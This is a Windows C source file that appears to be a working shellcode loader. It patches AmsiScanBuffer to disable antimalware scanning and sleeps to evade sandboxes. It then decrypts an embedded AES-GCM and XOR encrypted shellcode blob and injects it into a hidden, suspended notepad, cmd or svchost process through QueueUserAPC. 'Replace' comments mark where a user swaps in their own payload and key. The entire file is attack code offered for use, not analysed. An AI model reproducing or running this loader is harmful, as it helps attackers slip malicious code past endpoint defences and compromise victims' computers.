#include <windows.h>
#include <tlhelp32.h>
#include <string.h>
#include <openssl/evp.h>

#define AES_KEY_SIZE 32
#define GCM_IV_SIZE 12
#define GCM_TAG_SIZE 16
#define XOR_KEY 0x8a  // Replace

void bypass_amsi() {
    HMODULE h = LoadLibraryA("amsi.dll");
    if (h) {
        void* a = GetProcAddress(h, "AmsiScanBuffer");
        if (a) {
            DWORD o;
            VirtualProtect(a, 6, PAGE_EXECUTE_READWRITE, &o);
            *(BYTE*)a = 0xC3;
            VirtualProtect(a, 6, o, &o);
        }
    }
}

int decrypt(unsigned char* ct, int ct_len, unsigned char* key,
            unsigned char* iv, unsigned char* tag, unsigned char* pt) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return -1;
    
    int len, pt_len;
    
    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1 ||
        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, GCM_IV_SIZE, NULL) != 1 ||
        EVP_DecryptInit_ex(ctx, NULL, NULL, key, iv) != 1 ||
        EVP_DecryptUpdate(ctx, pt, &len, ct, ct_len) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }
    
    pt_len = len;
    
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, GCM_TAG_SIZE, tag) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }
    
    int ret = EVP_DecryptFinal_ex(ctx, pt + len, &len);
    EVP_CIPHER_CTX_free(ctx);
    
    return (ret > 0) ? pt_len + len : -1;
}
//Replace
unsigned char shellcode_encrypted[] = 
"\x09\x28\xb7\x08\xb2\x88\x58\x02\xb7\x23\xee\x51\x43\xec\x6b\xf2"
"\x51\x91\x24\x2f\xae\xc9\x50\xe8\xde\xd2\x78\x95\xea\xc3\xb1\xb8"
"\x8f\xa3\x1e\x7d\xbd\x4d\xfe\xed\xc1\xb7\x47\x29\xe6\x4f\xd9\x29"
"\x4b\x8c\xbd\x8a\x75\x27\x51\x92\x3e\x50\x52\x75\x5c\x31\x2e\x14"
"\x46\xd1\x5e\xa7\x7d\x0a\xc9\xa1\x25\x84\x49\xed\xd9\x4d\x73\x94"
"\x84\x5f\xfc\x4c\x13\x02\x94\x88\x23\x82\xe4\xbd\x85\x65\x0f\xb2"
"\x50\x80\xd9\x50\x36\xc5\x1f\x13\x99\x30\xf2\xd3\x73\xfe\x79\x71"
"\xbd\x6c\x76\x6f\x0b\x65\x8e\x6d\x20\xff\x5c\x22\x64\xed\x1b\x7d"
"\x4c\x4f\x5e\x00\xa9\x11\x68\x99\x8b\x6c\x44\x37\xb6\x23\x4a\x77"
"\xb9\x40\xa7\x0a\xfb\xba\x2a\xf8\x54\x4e\xbc\xd9\xaa\x81\xd5\xd3"
"\x1d\x36\x30\xfa\x91\x6b\x67\x8f\xc2\x11\x6a\xc1\x1c\x1b\x69\xae"
"\x87\x10\x83\x33\xd9\x76\xb7\xff\x2b\xcc\xc7\xf4\xe4\xcf\xc9\x2f"
"\x2c\x56\x79\xf0\x77\x14\x97\xb0\x42\x0c\x89\x62\xd9\xbb\x64\x16"
"\xae\x36\x4e\xac\x65\x01\x5d\xda\xcb\x93\xde\x4b\x07\x2f\xb9\xa6"
"\xce\x85\x0c\x0e\xf8\x70\xfb\x8b\xc6\x6d\xfb\x1d\xcf\x06\x55\x62"
"\x56\xab\x90\x9d\x73\xd8\x76\x54\xfd\x17\x2a\x11\x6c\xc4\x26\x7c"
"\x51\x44\x81\x8e\x08\xc6\x9b\xbe\x43\x29\x38\xf0\x1c\xe1\x4b\xbf"
"\x1d\x33\xd8\xc1\xcc\xdb\xe5\x85\x1f\x48\x92\xe9\x80\xdc\xd7\x18"
"\x3d\x2c\x72\x91\x99\xc1\x17\x83\xee\x89\x45\x7f\x26\xba\x5b\x3c"
"\xa4\xd0\xdf\x89\xcb\x68\x56\xdb\xfa\x7b\xec\xaf\x32\xc5\xdd\x1b"
"\xee\x2e\x88\x4a\x5b\xa4\x02\xe8\xb3\xef\xf9\x60\x29\x3c\xf8\x21"
"\xda\x15\x3b\xcd\xa3\x0f\xbd\x0f\x52\x8f\x09\x8b\x49\x70\xe8\x39"
"\x7d\x8c\x8d\x4d\xae\x23\x55\x47\x6f\x9a\x05\x17\xcd\x3c\xc9\xad"
"\x13\x0d\xd5\x21\xcd\x5e\x41\x57\xb1\x09\x7f\x0e\x5c\x34\xde\x2a"
"\x1a\x70\x8b\x99\xf7\x21\xa9\x35\x2c\x48\x25\x23\xe2\x1d\x3c\x7c"
"\xca\xf0\x06\x20\x3e\x0e\x55\x06\x35\xac\xb8\x9c\x7b\x3a\x53\x2f"
"\xca\xca\xc9\xe1\x65\x3c\x9a\xf7\xf0\x4b\x57\xda\xc6\xf1\xd8\x1d"
"\x8a\x9e\xbf\xa8\xca\x8f\x8e\x85\x8d\xc2\x07\xf1\x3f\x27\x60\x5a"
"\x4f\xd3\x6d\x10\x44\x8d\x08\xac\xd2\xf7\xf2\x22\x77\xcd\xa1\x5b"
"\xca\x78\x23\xaa\xf0\x06\xfe\xbb\x5b\xfa\x8c\xc6\x4f\x0b\x92\x0f"
"\x2b\xf4\x18\xd9\xc7\xce\xc8\xb6\x53\xb2\xec\xa9\x2c\x7a\x7d\x72"
"\xcf\x05\xf0\x7f\x87\x78\x25\x2a\x99\xc4\x99\xa6\x18\x0e\xfc\x6a"
"\xa2\xa0\x76\x66\xd6\xa5\x39\x71\xd6\xa5\x57\x9b\xfb\x56\xbb\x26"
"\x26\x5e\x14\x03\x10\x5d\xc0\x42\x91\x40\xa6\xbe\x3e\x69\x57\xa0"
"\x6d\x7b\x6e\xfd\x0f\x5f\xcd\x2f\xcd\x6a\xca\xda\x3d\x66\x1a\x81"
"\xf0\x84\x93\x35\x94\x39\x32\x7c\x53\xa3\xf8\x47\xbc\xdc\xfa\xd4"
"\xfb\x52\xe7\x99\x4a\x01\xc4\x0f\x8f\xf6\x6c\x34\x90\xe0\x9d\x55"
"\x78\x51\x5c\xa2\xb6\xab\x69\x90\x66\x23\x44\x36\x36\x39\x6c\xda"
"\x5a\x21\x09\xb6\xdf\x5b\x67\xb2\xf3\xc3\xbb\x24\x70\x07\x1c\xf9"
"\x48\x58\x08\xcb\xda\x60\xc8\x31\x60\xbe\x75\x3f\xb7\xed\x3c\xb5"
"\x24\x4d\x77\xb9\xc5\x16\xb4\xa3\x4b\x63\xbf\xfb\x18\x9d\x6c\xb1"
"\xcf\xd1\x62\x1f\x6e\x9d\xd0\x17\xba\xf4\x29\x0e\xa1\x18\x1c\x3c"
"\xb4\x30\x51\x9d\x89\xac\xce\xbc\x7d\x05\x3c\x87\x38\x68\x50\xf1"
"\xff\x23\x15\x51\x79\x62\x19\x0c\x86\xb7\x68\x88\x78\xd4\xee\xe6"
"\x06\x9f\x1e\x8b\x07\xce\xd1\x48\x8f\x62\x12\x0f\xeb\xa0\x6c\x36"
"\x3e\xaa\xfa\xa5\x1d\x37\xf4\x60\x53\xc1\x88\x01\x53\xfc\x9b\xfb"
"\x8d\xba\x27\x0c\x58\x68\x14\xbe\x56\xaf\xc0\x32\xed\x22\x7d\x33"
"\x4a\x81\xc4\xe9\xfd\x60\xd4\x71\x4f\x6c\x0f\x9f\x90\x9e\x03\x95"
"\x29\x2f\x7a\x2d\x98\x0c\xf8\x20\xdd\xa2\xfd\x72\x8a\xd5\x95\x4d"
"\x8b\x11\xa0\xa4\x7f\xf7\xfe\x3e\x25\x09\x95\x0a\xde\x22\x47\xb5"
"\x92\x06\xa2\x5c\x16\xc7\x8e\x7f\x1e\x19\xd1\x9c\xb9\x50\xee\x78"
"\x1b\xdf\x5f\xc8\xc8\xf3\x39\x69\xb0\xea\x9d\x57\x65\x2d\x63\xe7"
"\x9c\x3a\x59\xcd\x1b\xdd\x1e\x32\x72\xa2\x77\x30\x3c\xad\x5d\x73"
"\x1c\x67\x34\xf1\x18\xe8\x06\xae\xd7\xee\xab\x6f\x7c\xa5\x1b\x48"
"\x8b\x89\xbe\x87\x52\x07\x6d\xbc\x15\x9a\x40\x60\xff\x12\xbd\x0c"
"\x94\xf8\xea\x3a\xdc\x02\xa0\x70\x93\x61\x02\x90\x43\x24\x94\x87"
"\xf2\xd2\x09\xcd\x0d\xb8\x5e\x11\x06\xb3\x3a\x6d\xcd\x3d\x54\x31"
"\x05\x9e\x80\x9f\x1d\x62\x8e\x20";

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    Sleep(5000);
    bypass_amsi();
    

    DWORD enc_len = sizeof(shellcode_encrypted) - 1;
    const char* keyHex = "49a6a0faf66f0c8064d2ec618d965c1b6b87c927fac64e739b57f4ccbeb5a3e0"; //Replace
    
    if (enc_len < GCM_IV_SIZE + GCM_TAG_SIZE) return 0;
    
    unsigned char key[AES_KEY_SIZE];
    for (int i = 0; i < AES_KEY_SIZE; i++) {
        sscanf(keyHex + 2*i, "%2hhx", &key[i]);
    }
    
    unsigned char iv[GCM_IV_SIZE];
    memcpy(iv, shellcode_encrypted, GCM_IV_SIZE);
    
    DWORD ct_len = enc_len - GCM_IV_SIZE - GCM_TAG_SIZE;
    unsigned char* ct = shellcode_encrypted + GCM_IV_SIZE;
    unsigned char tag[GCM_TAG_SIZE];
    memcpy(tag, shellcode_encrypted + GCM_IV_SIZE + ct_len, GCM_TAG_SIZE);
    
    unsigned char* pt = (unsigned char*)malloc(ct_len);
    if (!pt) return 0;
    
    int pt_len = decrypt(ct, ct_len, key, iv, tag, pt);
    if (pt_len < 0) {
        free(pt);
        return 0;
    }
    
    for (int i = 0; i < pt_len; i++) pt[i] ^= XOR_KEY;
    

    

    const char* targets[] = {
        "C:\\Windows\\System32\\notepad.exe",
        "C:\\Windows\\System32\\cmd.exe",
        "C:\\Windows\\System32\\svchost.exe"
    };
    
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
 
    BOOL created = FALSE;
    for (int i = 0; i < 3; i++) {
        if (CreateProcessA(targets[i], NULL, NULL, NULL, FALSE, 
                          CREATE_SUSPENDED | CREATE_NO_WINDOW, 
                          NULL, NULL, &si, &pi)) {
            created = TRUE;
            break;
        }
    }
    
    if (!created) {
        free(pt);
        return 0;
    }
    

    LPVOID remoteAddr = VirtualAllocEx(pi.hProcess, NULL, pt_len, 
                                       MEM_COMMIT | MEM_RESERVE, 
                                       PAGE_READWRITE);
    if (!remoteAddr) {
        TerminateProcess(pi.hProcess, 0);
        free(pt);
        return 0;
    }
    

    SIZE_T written;
    if (!WriteProcessMemory(pi.hProcess, remoteAddr, pt, pt_len, &written)) {
        TerminateProcess(pi.hProcess, 0);
        free(pt);
        return 0;
    }
    
    free(pt);
    

    DWORD oldProtect;
    VirtualProtectEx(pi.hProcess, remoteAddr, pt_len, PAGE_EXECUTE_READ, &oldProtect);
    

    QueueUserAPC((PAPCFUNC)remoteAddr, pi.hThread, 0);
    

    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return 0;
}
